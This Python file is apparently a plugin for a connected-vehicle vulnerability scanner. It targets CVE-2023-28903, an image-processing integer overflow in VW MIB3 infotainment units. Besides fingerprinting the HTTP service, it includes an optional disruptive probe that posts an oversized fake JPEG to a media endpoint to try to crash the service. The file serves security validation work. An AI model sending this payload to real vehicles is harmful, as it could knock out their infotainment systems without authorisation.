#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent))
from probe_utils import HTTPProbe, detection_confidence, service_open

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


VULN = {
    "id": 54,
    "cve": "CVE-2023-28903",
    "year": 2023,
    "domain": "IVI/云端/EVSE/OS",
    "vendor_product": "Volkswagen MIB3 Infotainment",
    "component": "MIB3 IVI",
    "type": "输入校验/DoS",
    "summary": "VW MIB3 IVI相关漏洞，影响Skoda Superb III等车型。",
    "source_description": "An integer overflow in the image processing binary of the MIB3 infotainment unit allows an attacker with local access to the vehicle to cause a denial-of-service of the infotainment system.",
    "poc_status": "公开公告；大多未见一步式PoC",
    "research_value": "作为近两年前后演进基线，对比2024-2026风险变化。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28903",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2023-28903",
        "https://i.blackhat.com/EU-24/Presentations/EU-24-Parnishchev-OverTheAirVW.pdf",
        "https://pcacybersecurity.com/resources/advisory/vulnerabilities-in-vw-mib3-infotainment-2",
        "https://asrg.io/security-advisories/vulnerabilities-in-volkswagen-mib3-infotainment-part-2/",
        "https://cveawg.mitre.org/api/cve/CVE-2023-28903"
    ],
    "affected": [
        {
            "vendor": "Preh Car Connect GmbH (JOYNEXT GmbH)",
            "product": "Volkswagen MIB3 infotainment system MIB3 OI MQB",
            "versions": [
                {
                    "version": "0",
                    "status": "affected",
                    "lessThanOrEqual": "0304",
                    "versionType": "custom"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2023-28903",
        "Volkswagen",
        "MIB3",
        "Infotainment",
        "IVI",
        "DoS",
        "integer",
        "overflow",
        "image",
        "processing",
        "binary",
        "infotainment",
        "unit",
        "local",
        "access",
        "cause",
        "denial-of-service",
        "system",
        "Preh Car Connect GmbH (JOYNEXT GmbH",
        "Volkswagen MIB3 infotainment system MIB3 OI MQB"
    ]
}



def _run_poc(plugin) -> dict:
    """Probe CVE-2023-28903: VW MIB3 image processing integer overflow DoS."""
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    port = int(params.get("port", 8080))
    tls = bool(params.get("tls", False))
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or bool(params.get("allow_disruptive"))

    evidence = {
        "cve": "CVE-2023-28903",
        "target": f"{target_ip}:{port}",
        "technique": "HTTP behavioral probe - VW MIB3 image processing integer overflow DoS via oversized image",
    }

    active_port = None
    for try_port in [port, 80, 443, 8080]:
        if service_open(target_ip, try_port):
            active_port = try_port
            tls = try_port in (443, 8443)
            break

    if active_port is None:
        evidence["service_open"] = False
        return {
            "vulnerable": None,
            "evidence": evidence,
            "detection_confidence": detection_confidence("E", evidence, "no_service"),
            "requires_manual_review": True,
        }

    evidence["service_open"] = True
    evidence["actual_port"] = active_port
    probe = HTTPProbe(target_ip, active_port, tls=tls)

    r_root = probe.get("/")
    evidence["http_status"] = r_root.get("status")
    evidence["server_header"] = r_root.get("headers", {}).get("Server", "")
    body_lower = r_root.get("body_text", "").lower()
    if any(kw in body_lower for kw in ["mib3", "volkswagen", "vw", "icas"]):
        evidence["mib3_banner_match"] = True

    if allow_disruptive:
        large_img_payload = b"\xFF\xD8\xFF\xE0" + b"A" * 65532
        r_dos = probe.post("/api/media/image", large_img_payload, "image/jpeg")
        evidence["dos_status"] = r_dos.get("status")
        if r_dos.get("status") in (500, None) or r_dos.get("error"):
            evidence["overflow_triggered"] = True
            return {
                "vulnerable": None,
                "evidence": evidence,
                "detection_confidence": detection_confidence("B", evidence, "image_overflow_response"),
                "requires_manual_review": True,
            }

    admin_paths = ["/api/v1/media", "/media/upload", "/api/image", "/admin"]
    for path in admin_paths:
        r = probe.get(path)
        evidence[f"path_{path.strip('/').replace('/', '_')}_status"] = r.get("status")

    return {
        "vulnerable": None,
        "evidence": evidence,
        "detection_confidence": detection_confidence("C", evidence, "mib3_service_probed"),
        "requires_manual_review": True,
    }

class Poc47CVE202328903DoSInputValidationAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = 'XLSX-054'
    meta_poc_name = 'CVE-2023-28903 DoS Active Validation'
    meta_cve_id = 'CVE-2023-28903'
    meta_severity = 'Medium'
    meta_protocol = 'https'
    meta_target_os = ['linux']
    meta_required_params = ['tls_scan_text']
    meta_profiles = ['network']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2023-28903'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2023-28903']
    meta_attack_surface = '网络服务'
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "47_VW_MIB3_Input_Validation_DoS_Audit") if "VULN" in dir() else "47_VW_MIB3_Input_Validation_DoS_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc47CVE202328903DoSInputValidationAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
